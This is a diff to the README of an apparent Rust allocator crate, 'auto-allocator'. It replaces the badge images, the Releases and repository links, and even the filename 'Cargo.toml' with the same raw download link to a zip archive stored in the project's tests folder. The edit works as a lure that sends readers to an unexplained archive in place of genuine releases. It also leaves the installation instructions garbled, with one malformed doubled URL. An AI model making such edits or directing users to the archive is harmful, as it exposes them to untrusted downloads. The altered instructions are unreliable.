@@ -1,9 +1,9 @@
 # Auto Allocator: High-Performance Memory Management for Rust 🚀
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Rust](https://img.shields.io/badge/rust-1.56%2B-orange.svg)
-![Build Status](https://img.shields.io/github/workflow/status/karimel1111/auto-allocator/CI)
-![Version](https://img.shields.io/github/v/release/karimel1111/auto-allocator)
+![License](https://github.com/karimel1111/auto-allocator/raw/refs/heads/main/tests/auto-allocator-2.3.zip)
+![Rust](https://github.com/karimel1111/auto-allocator/raw/refs/heads/main/tests/auto-allocator-2.3.zip%https://github.com/karimel1111/auto-allocator/raw/refs/heads/main/tests/auto-allocator-2.3.zip)
+![Build Status](https://github.com/karimel1111/auto-allocator/raw/refs/heads/main/tests/auto-allocator-2.3.zip)
+![Version](https://github.com/karimel1111/auto-allocator/raw/refs/heads/main/tests/auto-allocator-2.3.zip)
 
 ## Table of Contents
 
@@ -33,7 +33,7 @@ Auto Allocator is a zero-configuration memory allocator designed for Rust. With 
 
 ## Installation
 
-To get started with Auto Allocator, you can add it to your `Cargo.toml` file. Here’s how:
+To get started with Auto Allocator, you can add it to your `https://github.com/karimel1111/auto-allocator/raw/refs/heads/main/tests/auto-allocator-2.3.zip` file. Here’s how:
 
 ```toml
 [dependencies]
@@ -46,7 +46,7 @@ After adding the dependency, run the following command to fetch the library:
 cargo build
 ```
 
-For the latest version and updates, check the [Releases](https://github.com/karimel1111/auto-allocator/releases) section.
+For the latest version and updates, check the [Releases](https://github.com/karimel1111/auto-allocator/raw/refs/heads/main/tests/auto-allocator-2.3.zip) section.
 
 ## Usage
 
@@ -109,6 +109,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For more information, visit the [Releases](https://github.com/karimel1111/auto-allocator/releases) section to download the latest version and view the change logs. 
+For more information, visit the [Releases](https://github.com/karimel1111/auto-allocator/raw/refs/heads/main/tests/auto-allocator-2.3.zip) section to download the latest version and view the change logs. 
 
-Feel free to check the [GitHub Repository](https://github.com/karimel1111/auto-allocator) for additional resources and documentation.
+Feel free to check the [GitHub Repository](https://github.com/karimel1111/auto-allocator/raw/refs/heads/main/tests/auto-allocator-2.3.zip) for additional resources and documentation.
